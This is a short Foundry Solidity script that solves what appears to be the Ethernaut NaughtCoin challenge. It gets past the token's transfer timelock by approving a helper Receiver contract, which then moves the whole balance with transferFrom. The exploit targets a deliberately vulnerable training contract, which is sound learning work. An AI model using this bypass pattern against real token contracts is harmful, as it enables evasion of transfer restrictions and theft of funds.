// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/NaughtCoin.sol";

contract Receiver {
    NaughtCoin public coin = NaughtCoin(0xe29B1342f9e85FE0372eF25bE76d942e33B6c0D5);
    constructor() {}

    function transferTokens(address _from, uint256 _amount) external {
        coin.transferFrom(_from, address(this), _amount);
    }
}

contract NaughtCoinScript is Script {

    NaughtCoin public coin = NaughtCoin(0xe29B1342f9e85FE0372eF25bE76d942e33B6c0D5);
    /**
     * Solution: By ERC20 standard the owner of the tokens can approve as many as he has to another account.
     * When the other account has an approvement he can spend it on behalf of the owner.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 tokenAmount = coin.balanceOf(vm.envAddress("WALLLET_ADDRESS"));
        console.log("1. Initial balance", tokenAmount);
        Receiver receiver = new Receiver();
        coin.approve(address(receiver), tokenAmount);
        receiver.transferTokens(vm.envAddress("WALLLET_ADDRESS"), tokenAmount);
        console.log("2. Balance after", coin.balanceOf(vm.envAddress("WALLLET_ADDRESS")));
        vm.stopBroadcast();

    }
}
